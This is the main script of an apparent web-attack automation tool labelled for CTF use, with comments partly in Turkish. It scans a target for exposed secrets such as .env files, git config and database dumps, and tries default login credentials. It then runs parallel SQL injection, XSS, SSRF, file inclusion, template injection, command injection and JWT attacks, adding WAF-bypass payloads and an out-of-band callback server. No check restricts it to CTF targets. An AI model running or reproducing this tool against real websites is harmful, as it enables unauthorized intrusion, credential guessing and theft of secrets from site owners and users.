"""
T-Web - CTF Web Attack Automation Tool
Author: Tajaa
Usage: python main.py -u https://target.ctf/ [options]
"""
from __future__ import annotations
import asyncio
import os
import sys
from pathlib import Path

import click
from rich.console import Console
from urllib.parse import urlparse as _urlparse

_env_file = Path(__file__).parent / ".env"
if _env_file.exists():
    for _line in _env_file.read_text().splitlines():
        if "=" in _line and not _line.startswith("#"):
            _k, _, _v = _line.partition("=")
            os.environ.setdefault(_k.strip(), _v.strip())

sys.path.insert(0, str(Path(__file__).parent))

from engine.recon import run_recon
from engine.flag_hunter import extract_interesting_data, has_definite_flag
from engine.session_bridge import build_httpx_session
from attacks.base import SessionManager, SessionExpiredError
from attacks.sqli import SQLiAttack
from attacks.xss import XSSAttack
from attacks.ssrf import SSRFAttack
from attacks.lfi import LFIAttack
from attacks.ssti import SSTIAttack
from attacks.idor import IDORAttack
from attacks.nosql import NoSQLAttack
from attacks.cmdi import CMDiAttack
from attacks.jwt import JWTAttack
from skills.bridge import get_payloads
from utils.http_client import build_client, RateLimitedClient
from utils.oob_server import OOBServer
from utils.reporter import (
    print_banner, print_phase, print_findings,
    print_flag_found, export_finding,
)
from utils.waf_detect import detect_waf, get_bypass_payloads

console = Console()

ATTACK_MODULES = {
    "sqli": SQLiAttack,
    "xss": XSSAttack,
    "ssrf": SSRFAttack,
    "lfi": LFIAttack,
    "ssti": SSTIAttack,
    "idor": IDORAttack,
    "nosql": NoSQLAttack,
    "cmdi": CMDiAttack,
    "jwt": JWTAttack,
}

PASSIVE_TARGETS = [
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config",
    ".env", ".env.local", ".env.production", ".env.backup",
    "api/docs", "swagger.json", "openapi.json",
    "api/swagger.json", "api/openapi.json", "v1/swagger.json",
    "admin/", "wp-admin/", "phpmyadmin/", "adminer.php",
    "backup.zip", "backup.sql", "dump.sql", "database.sql",
    "flag.txt", "flag", "secret.txt", "secret",
    "config.php", "config.yml", "config.yaml", "settings.py",
    "debug/", "test/", "dev/",
    ".DS_Store", "web.config", ".htaccess",
    "phpinfo.php", "info.php", "test.php",
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("test", "test"), ("root", "root"),
    ("administrator", "administrator"), ("user", "user"), ("guest", "guest"),
]


async def run_passive_recon(base_url: str, client: RateLimitedClient) -> list[dict]:
    from urllib.parse import urlparse as _urlparse
    # Pasif recon her zaman origin'e (scheme+host+port) probe yapar
    _p = _urlparse(base_url)
    origin = f"{_p.scheme}://{_p.netloc}"

    # Soft 404 baseline: var olmayan bir path'in final URL'si ve body uzunluğu
    soft_404_final_url = ""
    soft_404_len = -1
    try:
        baseline = await client.get(
            f"{origin}/zzz_tweb_baseline_xyz123456",
            timeout=5.0,
        )
        if baseline.status_code == 200:
            soft_404_final_url = str(baseline.url)
            soft_404_len = len(baseline.text)
    except Exception:
        pass

    def _is_soft_404(resp) -> bool:
        if soft_404_len < 0:
            return False
        # Redirect sonrası aynı URL'ye düştüyse (örn. her şey /login.php'ye gidiyorsa)
        if soft_404_final_url and str(resp.url) == soft_404_final_url:
            return True
        # Body uzunluğu baseline ile ±2% veya ±200 karakter içindeyse
        diff = abs(len(resp.text) - soft_404_len)
        if diff < max(200, int(soft_404_len * 0.02)):
            return True
        return False

    async def probe(path: str):
        try:
            resp = await client.get(f"{origin}/{path}", timeout=5.0)
            if resp.status_code in (200, 301, 302, 403):
                if _is_soft_404(resp):
                    return None
                return {"path": path, "status": resp.status_code, "preview": resp.text[:200]}
        except Exception:
            pass
        return None

    results = await asyncio.gather(*[probe(p) for p in PASSIVE_TARGETS])
    return [r for r in results if r is not None]


async def try_default_creds(login_url: str, client: RateLimitedClient) -> dict | None:
    for username, password in DEFAULT_CREDS:
        try:
            resp = await client.post(
                login_url,
                data={"username": username, "password": password},
                timeout=8.0,
            )
            if resp.status_code in (200, 302) and any(
                hint in resp.text.lower()
                for hint in ["dashboard", "welcome", "logout", "admin", "profile"]
            ):
                console.print(f"  [bold green][AUTH][/bold green] Default creds work: {username}/{password}")
                return {"username": username, "password": password, "response": resp}
        except Exception:
            pass
    return None


async def main_async(
    url: str,
    proxy: str | None,
    no_verify: bool,
    attacks_filter: list[str],
    login_path: str | None,
    username: str | None,
    password: str | None,
    rate_limit: float,
    delay: float,
    concurrency: int,
    max_pages: int,
):
    print_banner()

    base_client = build_client(
        proxy=proxy,
        no_verify=no_verify,
        rate_per_sec=rate_limit,
        min_delay=delay,
        concurrency=concurrency,
    )

    oob = OOBServer()
    oob_url = await oob.start(port=9999)
    console.print(f"  [dim]OOB server: {oob_url}[/dim]")

    # Phase 0: Passive Recon
    print_phase(0, "Pasif Recon — Hızlı Kazanç")
    passive_hits = await run_passive_recon(url, base_client)

    if passive_hits:
        console.print(f"  [yellow]Pasif bulgular ({len(passive_hits)}):[/yellow]")
        for hit in passive_hits:
            flag_in_passive = has_definite_flag(extract_interesting_data(hit["preview"]))
            status_style = "green" if hit["status"] == 200 else "yellow"
            console.print(
                f"  [{status_style}][{hit['status']}][/{status_style}] "
                f"{hit['path']}: {hit['preview'][:80]}"
            )
            if flag_in_passive:
                console.print(f"\n  [bold green]FLAG PASSIVE RECON'DA BULUNDU![/bold green]")
                print_flag_found(flag_in_passive, "passive_recon", f"{url}/{hit['path']}")
                export_finding(
                    flag=flag_in_passive,
                    payload="passive GET",
                    vector="passive_recon",
                    request_url=f"{url.rstrip('/')}/{hit['path']}",
                    request_method="GET",
                    request_headers={},
                    response_status=hit["status"],
                    response_headers={},
                    response_body_preview=hit["preview"],
                )
                await base_client.aclose()
                await oob.stop()
                return

    _parsed_url = _urlparse(url)
    _origin = f"{_parsed_url.scheme}://{_parsed_url.netloc}"
    login_url = f"{_origin}{login_path}" if login_path else None
    if login_url and not username:
        console.print(f"  [dim]Default credentials deneniyor: {login_url}[/dim]")
        await try_default_creds(login_url, base_client)

    # Phase 1: Active Recon
    print_phase(1, "Aktif Recon (Playwright Crawler)")
    recon_login_url = f"{_origin}{login_path}" if login_path else None
    recon_data = await run_recon(
        url,
        max_pages=max_pages,
        login_url=recon_login_url,
        username=username,
        password=password,
    )

    console.print(
        f"  Tech stack: {', '.join(recon_data['tech_stack']) or 'Bilinmiyor'}\n"
        f"  Sayfa sayısı: {recon_data['pages_crawled']}\n"
        f"  Attack point: {len(recon_data['attack_points'])}\n"
        f"  Ghost API: {len(recon_data['ghost_apis'])}"
    )

    for note in recon_data.get("notes", []):
        console.print(f"  [yellow]⚠ {note}[/yellow]")

    head_resp = await base_client.get(url)
    waf = detect_waf(dict(head_resp.headers), head_resp.text, head_resp.status_code)
    if waf:
        console.print(f"  [yellow]⚠ WAF tespit edildi: {waf}[/yellow]")

    # Phase 2: Attack
    print_phase(2, "Paralel Saldırı")

    session_data = recon_data.get("session_data", {
        "cookies": [], "jwt": None, "csrf": None,
        "local_storage": {}, "session_storage": {},
    })

    if login_path and username and password:
        console.print(f"  [dim]Auth: {login_path} → {username}[/dim]")
        try:
            import re as _re
            _login_get = await base_client.get(f"{_origin}{login_path}")
            _login_data: dict = {}

            # Parse all <input> elements and fill by type
            for _m in _re.finditer(r'<input\s[^>]+?/?>', _login_get.text, _re.IGNORECASE):
                _tag = _m.group(0)
                _t_m = _re.search(r'\btype=["\']?(\w+)', _tag, _re.IGNORECASE)
                _t = _t_m.group(1).lower() if _t_m else "text"
                _nm = _re.search(r'\bname=["\']([^"\']+)["\']', _tag)
                _vm = _re.search(r'\bvalue=["\']([^"\']*)["\']', _tag)
                if not _nm:
                    continue
                _name = _nm.group(1)
                _val = _vm.group(1) if _vm else ""
                if _t == "hidden":
                    _login_data[_name] = _val
                elif _t == "password":
                    _login_data[_name] = password
                elif _t == "text":
                    # Handles 'login', 'user', 'email', 'username', etc.
                    _login_data[_name] = username

            # Parse <select> elements — pick first option (lowest/safest, e.g. 0=low for bWAPP)
            for _m in _re.finditer(
                r'<select[^>]+name=["\']([^"\']+)["\'][^>]*>(.*?)</select>',
                _login_get.text, _re.IGNORECASE | _re.DOTALL,
            ):
                _opts = _re.findall(
                    r'<option[^>]+value=["\']([^"\']*)["\']', _m.group(2), _re.IGNORECASE
                )
                if _opts:
                    _login_data[_m.group(1)] = _opts[0]

            if _login_data:
                await base_client.post(f"{_origin}{login_path}", data=_login_data)
            else:
                # No HTML form found — JSON API login (Juice Shop, modern SPAs)
                for _jbody in [
                    {"email": username, "password": password},
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                ]:
                    try:
                        _jr = await base_client.post(
                            f"{_origin}{login_path}", json=_jbody
                        )
                        if _jr.status_code in (200, 201, 204):
                            break
                    except Exception:
                        pass

            # Playwright's session is authoritative — it ran the real browser login
            # (including security_level=0 select). httpx login may only ADD cookies
            # that Playwright doesn't already have. Never overwrite Playwright's values.
            _session_cookie_names = {"phpsessid", "session", "sid", "jsessionid", "connect.sid"}
            _pw_names = {c["name"] for c in session_data["cookies"]}
            for _cname, _cvalue in base_client._client.cookies.items():
                if _cname.lower() in _session_cookie_names:
                    continue  # Never overwrite Playwright's session ID
                if _cname not in _pw_names:
                    session_data["cookies"].append({"name": _cname, "value": _cvalue})
        except Exception as e:
            console.print(f"  [yellow]Auth failed: {e}[/yellow]")

    _jwt_preview = session_data.get("jwt")
    if _jwt_preview:
        console.print(f"  [dim]JWT: {_jwt_preview[:40]}...[/dim]")
    else:
        console.print(f"  [dim]JWT: bulunamadı[/dim]")

    http_client = build_httpx_session(
        session_data,
        proxy=proxy,
        no_verify=no_verify,
    )
    session_mgr = SessionManager(http_client)
    stop_event = asyncio.Event()
    enabled_vectors = set(attacks_filter) if attacks_filter else set(ATTACK_MODULES.keys())

    expanded = []
    for ap in recon_data.get("attack_points", []):
        for v in enabled_vectors:
            ap_copy = dict(ap)
            ap_copy["vector"] = v
            expanded.append(ap_copy)
    attack_points = expanded

    if "jwt" in enabled_vectors and session_data.get("jwt"):
        _jwt_test_urls = [url] + [ap["url"] for ap in recon_data["attack_points"][:5]]
        expanded.append({
            "type": "jwt_token",
            "url": url,
            "method": "GET",
            "param": None,
            "jwt_value": session_data["jwt"],
            "jwt_cookie_name": next(
                (c["name"] for c in session_data.get("cookies", [])
                 if c["name"].lower() in ("token", "jwt", "access_token", "id_token")),
                None,
            ),
            "test_urls": list(dict.fromkeys(_jwt_test_urls)),
            "vector": "jwt",
        })

    async def run_attack_on_point(ap: dict):
        if stop_event.is_set():
            return []

        vector = ap.get("vector")
        if not vector or vector not in enabled_vectors:
            return []

        attack_cls = ATTACK_MODULES.get(vector)
        if not attack_cls:
            return []

        skill_payloads = get_payloads(vector)

        if waf and vector in ("sqli", "xss", "lfi", "ssti"):
            tampered = [tp for p in skill_payloads for tp in get_bypass_payloads(p)]
            all_payloads = skill_payloads + tampered
        else:
            all_payloads = skill_payloads

        attacker = attack_cls(session=session_mgr, oob_server=oob, stop_event=stop_event)
        try:
            return await attacker.run(ap, all_payloads)
        except SessionExpiredError as e:
            console.print(f"[red]{e}[/red]")
            stop_event.set()
            return []
        except Exception as e:
            console.print(f"  [dim][!] {vector}: {e}[/dim]")
            return []

    grouped: dict[str, list[dict]] = {}
    for ap in attack_points:
        v = ap.get("vector")
        if v and v in enabled_vectors:
            grouped.setdefault(v, []).append(ap)

    all_findings_acc: list[dict] = []

    for vector, points in grouped.items():
        if stop_event.is_set():
            break
        tasks = [run_attack_on_point(p) for p in points[:30]]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, list):
                all_findings_acc.extend(result)
                for finding in result:
                    flag = None
                    if finding.get("confidence", 0) >= 1.0:
                        flag = finding["value"]
                    elif "flag" in finding["type"].lower():
                        flag = finding["value"]

                    if flag:
                        print_flag_found(flag, vector, url)
                        export_finding(
                            flag=flag,
                            payload=str(finding.get("value", "")),
                            vector=vector,
                            request_url=url,
                            request_method="GET",
                            request_headers={},
                            response_status=200,
                            response_headers={},
                            response_body_preview=flag,
                        )
                        stop_event.set()

    # Phase 3: Results
    print_phase(3, "Sonuçlar")
    if all_findings_acc:
        seen_values: set[str] = set()
        deduped_findings = []
        for f in sorted(all_findings_acc, key=lambda x: x.get("confidence", 0), reverse=True):
            if f["value"] not in seen_values:
                seen_values.add(f["value"])
                deduped_findings.append(f)
        print_findings(deduped_findings)
    else:
        console.print("  [dim]Bulgu bulunamadı.[/dim]")

    await base_client.aclose()
    await session_mgr.aclose()
    await oob.stop()


@click.command()
@click.option("-u", "--url", required=True, help="Hedef URL (örn: https://target.ctf/)")
@click.option("--proxy", default=None, help="Burp proxy (örn: http://127.0.0.1:8080)")
@click.option("--no-verify", is_flag=True, default=False, help="SSL cert doğrulamasını kapat")
@click.option("--attacks", default=None, help="Virgülle ayrılmış vektörler: sqli,xss,ssrf,lfi,ssti,idor,nosql,cmdi,jwt")
@click.option("--login", default=None, help="Login path (örn: /login)")
@click.option("--user", default=None, help="Login kullanıcı adı")
@click.option("--pass", "password", default=None, help="Login şifre")
@click.option("--rate-limit", default=5.0, type=float, help="İstekler/saniye (default: 5)")
@click.option("--delay", default=0.0, type=float, help="İstekler arası min bekleme sn (default: 0)")
@click.option("--concurrency", default=5, type=int, help="Eş zamanlı bağlantı (default: 5)")
@click.option("--max-pages", default=50, type=int, help="Max crawl sayfa (default: 50)")
def cli(
    url, proxy, no_verify, attacks,
    login, user, password, rate_limit, delay, concurrency, max_pages,
):
    """T-Web — CTF Web Attack Automation Tool by Tajaa"""
    if not url.startswith("http"):
        url = "http://" + url

    attacks_filter = [a.strip() for a in attacks.split(",")] if attacks else []

    asyncio.run(main_async(
        url=url,
        proxy=proxy,
        no_verify=no_verify,
        attacks_filter=attacks_filter,
        login_path=login,
        username=user,
        password=password,
        rate_limit=rate_limit,
        delay=delay,
        concurrency=concurrency,
        max_pages=max_pages,
    ))


if __name__ == "__main__":
    cli()
